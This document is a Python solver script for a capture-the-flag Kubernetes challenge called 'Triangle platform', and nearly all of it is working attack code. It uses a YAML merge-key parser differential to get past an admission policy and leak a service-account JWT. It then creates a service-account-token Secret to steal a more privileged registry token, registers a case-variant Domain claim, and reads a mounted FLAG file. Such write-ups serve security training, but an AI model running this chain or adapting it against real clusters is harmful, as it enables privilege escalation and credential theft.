#!/usr/bin/env python3

"""Solver for Triangle platform.

The target is an HTTP/Kubernetes challenge rather than an ELF binary.  The
script uses only the supplied console proxy and tokens obtained from the
challenge itself.
"""

import base64
import json
import re
import sys
import time
from urllib.parse import urljoin

import requests
import urllib3


DEFAULT_HOST = "triangle-platform-c7baabe33ba7.chall.nnsc.tf"
SITE_NAME = "triangle-solve"
SECRET_NAME = "triangle-solve-registry-token"
DOMAIN_NAME = "triangle-solve-case-claim"

EDGE_YAML = """target: null
integrations: [edge]
<<: {integrations: [forms]}
server:
  root: /var/run/triangle
  index: token
"""

ORIGIN_YAML = """target:
  plane: origin
integrations:
  - forms
server:
  root: /var/run/origin
  index: FLAG
"""


def option(name, default=None):
    prefix = name + "="
    for arg in sys.argv[1:]:
        if arg.startswith(prefix):
            return arg[len(prefix):]
    return default


def has_arg(name):
    return name in sys.argv[1:]


def base_url():
    if has_arg("REMOTE"):
        host = option("HOST", DEFAULT_HOST)
        port = option("PORT")
        scheme = option("SCHEME", "https")
        suffix = f":{port}" if port else ""
        return f"{scheme}://{host}{suffix}/"
    return option("URL", "http://127.0.0.1:7681/")


def endpoint(base, path):
    return urljoin(base, path.lstrip("/"))


def require_ok(response, action):
    if not response.ok:
        raise RuntimeError(
            f"{action} failed: HTTP {response.status_code}: "
            f"{response.text[:600]}"
        )


def decode_jwt_payload(token):
    try:
        payload = token.split(".")[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except (IndexError, ValueError, json.JSONDecodeError) as exc:
        raise RuntimeError("preview did not return a JWT") from exc


def wait_site(session, base, site_path, timeout=90):
    deadline = time.time() + timeout
    last = None
    while time.time() < deadline:
        response = session.get(endpoint(base, site_path), timeout=15)
        require_ok(response, "reading site status")
        obj = response.json()
        status = obj.get("status", {})
        phase = status.get("phase", "Pending")
        message = status.get("message", "")
        state = (phase, message)
        if state != last:
            print(f"[*] phase={phase} message={message}")
            last = state
        if phase == "Error":
            raise RuntimeError(f"operator rejected site: {message}")
        if phase == "Ready":
            return obj
        time.sleep(1)
    raise RuntimeError("timed out waiting for operator reconciliation")


def upsert_site(session, base, name, site_yaml):
    site_path = f"/apis/triangle.io/v1/namespaces/tenant-a/sites/{name}"
    body = {
        "apiVersion": "triangle.io/v1",
        "kind": "Site",
        "metadata": {"name": name},
        "spec": {"siteYAML": site_yaml},
    }
    current = session.get(endpoint(base, site_path), timeout=15)
    if current.status_code == 200:
        body["metadata"]["resourceVersion"] = current.json()["metadata"][
            "resourceVersion"
        ]
        response = session.put(endpoint(base, site_path), json=body, timeout=15)
        action = "updating site"
    elif current.status_code == 404:
        response = session.post(
            endpoint(base, "/apis/triangle.io/v1/namespaces/tenant-a/sites"),
            json=body,
            timeout=15,
        )
        action = "creating site"
    else:
        require_ok(current, "checking site")
        raise AssertionError("unreachable")
    require_ok(response, action)
    return site_path


def read_preview(session, base, name, expected=None, timeout=120):
    path = f"/api/v1/namespaces/tenant-a/services/{name}:80/proxy/"
    deadline = time.time() + timeout
    last_status = None
    while time.time() < deadline:
        response = session.get(endpoint(base, path), timeout=15)
        if response.status_code != last_status:
            print(f"[*] preview HTTP {response.status_code}")
            last_status = response.status_code
        if response.status_code == 200:
            body = response.text
            if expected == "jwt" and body.count(".") == 2:
                return body
            if expected == "flag" and re.search(r"NNS\{[^}\r\n]+\}", body):
                return body
            if expected is None:
                return body
        time.sleep(1)
    raise RuntimeError("timed out waiting for the site service")


def get_or_create_registry_token(session, base, edge_token):
    secret_path = (
        "/api/v1/namespaces/triangle-system/secrets/" + SECRET_NAME
    )
    secret = {
        "apiVersion": "v1",
        "kind": "Secret",
        "metadata": {
            "name": SECRET_NAME,
            "annotations": {
                "kubernetes.io/service-account.name": "tri-registry-sync"
            },
        },
        "type": "kubernetes.io/service-account-token",
    }
    headers = {"Authorization": f"Bearer {edge_token}"}
    response = session.post(
        endpoint(base, "/api/v1/namespaces/triangle-system/secrets"),
        headers=headers,
        json=secret,
        timeout=15,
    )
    if response.status_code not in (201, 409):
        require_ok(response, "creating service-account token Secret")
    print("[+] tri-edge created or reused the registry token Secret")

    deadline = time.time() + 60
    while time.time() < deadline:
        response = session.get(endpoint(base, secret_path), headers=headers, timeout=15)
        require_ok(response, "reading registry token Secret")
        data = response.json().get("data", {})
        if data.get("token"):
            token = base64.b64decode(data["token"]).decode()
            print(f"[+] obtained tri-registry-sync token ({len(token)} bytes)")
            return token
        time.sleep(1)
    raise RuntimeError("timed out waiting for service-account token Secret")


def create_case_claim(session, base, registry_token, site_name):
    path = "/apis/triangle.io/v1/domains"
    claim = {
        "apiVersion": "triangle.io/v1",
        "kind": "Domain",
        "metadata": {"name": DOMAIN_NAME},
        "spec": {
            "host": "ACME-invoices.sites.triangle.tld",
            "siteRef": {"namespace": "tenant-a", "name": site_name},
        },
    }
    headers = {"Authorization": f"Bearer {registry_token}"}
    response = session.post(
        endpoint(base, path), headers=headers, json=claim, timeout=15
    )
    if response.status_code == 409:
        existing = session.get(
            endpoint(base, path + "/" + DOMAIN_NAME), headers=headers, timeout=15
        )
        require_ok(existing, "checking existing Domain claim")
        actual = existing.json().get("spec", {})
        if actual.get("siteRef", {}).get("name") != site_name:
            raise RuntimeError("existing Domain claim points to another site")
        print("[+] reused existing case-variant Domain claim")
        return
    require_ok(response, "creating case-variant Domain claim")
    print("[+] created case-variant Domain claim")


def main():
    base = base_url()
    if base.startswith("https://"):
        urllib3.disable_warnings()
    session = requests.Session()
    session.verify = not base.startswith("https://")
    session.headers.update({"User-Agent": "triangle-solve/2.0"})

    # The null target preserves the operator's control-plane default while
    # yaml.parse sees no target plane.  Explicit edge wins over the merge for
    # yaml.v3, while the Kyverno policy sees the merged forms value.
    site_path = upsert_site(session, base, SITE_NAME, EDGE_YAML)
    print(f"[+] edge probe site {SITE_NAME} accepted")
    wait_site(session, base, site_path)
    token_text = read_preview(session, base, SITE_NAME, expected="jwt")
    edge_payload = decode_jwt_payload(token_text.strip())
    print(f"[+] token subject={edge_payload.get('sub')} aud={edge_payload.get('aud')}")
    if edge_payload.get("sub") != "system:serviceaccount:tenant-a:tri-edge":
        raise RuntimeError("parser differential did not produce a tri-edge token")

    registry_token = get_or_create_registry_token(
        session, base, token_text.strip()
    )
    create_case_claim(session, base, registry_token, SITE_NAME)

    upsert_site(session, base, SITE_NAME, ORIGIN_YAML)
    print("[+] switched site to origin and requested the mounted FLAG file")
    wait_site(session, base, site_path)
    body = read_preview(session, base, SITE_NAME, expected="flag")
    print(f"[+] preview body: {body.strip()!r}")
    match = re.search(r"NNS\{[^}\r\n]+\}", body)
    if not match:
        raise RuntimeError("preview did not contain a flag-shaped value")
    print(f"<FLAG>{match.group(0)}</FLAG>")


if __name__ == "__main__":
    try:
        main()
    except (requests.RequestException, RuntimeError) as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
